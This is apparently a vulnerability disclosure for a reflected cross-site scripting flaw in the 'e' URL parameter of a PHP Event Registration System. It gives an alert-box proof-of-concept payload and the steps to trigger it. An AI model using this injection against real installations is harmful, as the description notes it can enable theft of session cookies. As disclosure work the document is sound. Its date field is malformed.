# Event Registration System - Cross-Site-Scripting - 2
+ *Exploit Title:* Event Registration System - Cross-Site-Scripting - 2
+ *Date:* 2024-17-04
+ *Exploit Author:* Burak Sevben
+ *Vendor Homepage:* https://www.sourcecodester.com/php/14884/event-registration-system-qr-code-php-free-source-code.html
+ *Software Link:* https://www.sourcecodester.com/download-code?nid=14884&title=Event+Registration+System+with+QR+Code+in+PHP+Free+Source+Code
+ *Version:* Latest
+ *Tested on:* Kali Linux + PHP 8.2.12, Apache 2.4.58
+ *CVE:* Reported, waiting for CVE number

## Description:
Event Registration System is vulnerable to a cross-site scripting vulnerability because it fails to adequately sanitize user-supplied data. An attacker could exploit this issue to run arbitrary scripting code in an unsuspecting user's browser in the context of the affected site. This could allow an attacker to steal cookie-based authentication credentials and launch other attacks.


## Proof of Concept:
+ Go to any page, ex : http://localhost/event/registrar/?page=registration&e=c4ca4238a0b923820dcc509a6f75849b
+ Write a xss code in e section `'"><img src=x onerror=alert(2)>`
+ XSS will be triggered.

![Ekran görüntüsü 2024-05-18 235720](https://github.com/BurakSevben/CVEs/assets/117217689/8ba42c30-1193-474f-bcca-04e31676a454)



![Ekran görüntüsü 2024-05-18 235733](https://github.com/BurakSevben/CVEs/assets/117217689/cd2c1082-e013-4635-b5b7-8d17b1cddf90)
